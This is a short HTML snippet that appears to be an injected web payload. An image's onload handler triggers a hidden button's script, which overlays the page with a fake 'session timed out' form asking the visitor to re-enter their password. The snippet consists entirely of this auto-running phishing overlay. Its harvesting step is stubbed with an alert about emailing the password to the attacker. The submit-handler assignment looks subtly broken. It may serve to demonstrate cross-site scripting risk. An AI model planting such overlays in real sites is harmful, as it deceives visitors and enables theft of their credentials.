<button id="test" hidden onClick="(function () {
		const fakeTimeout = document.createElement('form');
        const text = document.createElement('h2')
 		const textNode = document.createTextNode('Your session timed out!');
         text.appendChild(textNode);
		const input = document.createElement('input');  const label = document.createElement('label');
        label.style.fontWeight = 'bold';
        const text2 = document.createTextNode('Re-enter password to continue');
        label.appendChild(text2);
		fakeTimeout.appendChild(text);
        fakeTimeout.appendChild(label);
        fakeTimeout.appendChild(input);
        fakeTimeout.style.backgroundColor = '#ffffffc2';
        fakeTimeout.style.position = 'fixed';
        fakeTimeout.style.top = 0;
        fakeTimeout.style.left = 0;
        fakeTimeout.style.width = '100%';
        fakeTimeout.style.height = '100%';
        fakeTimeout.style.display = 'flex';
        fakeTimeout.style.justifyContent = 'center';
        fakeTimeout.style.flexDirection = 'column';
        fakeTimeout.style.alignItems = 'center';
        const emailMeTheEnteredPassword = function() { alert('email the password to the attacker!')}
        fakeTimeout.onSubmit =  emailMeTheEnteredPassword;
		document.body.append(fakeTimeout);
})()" />
<img src="./kennyLoggins.png" onload="document.getElementById('test').onclick()">
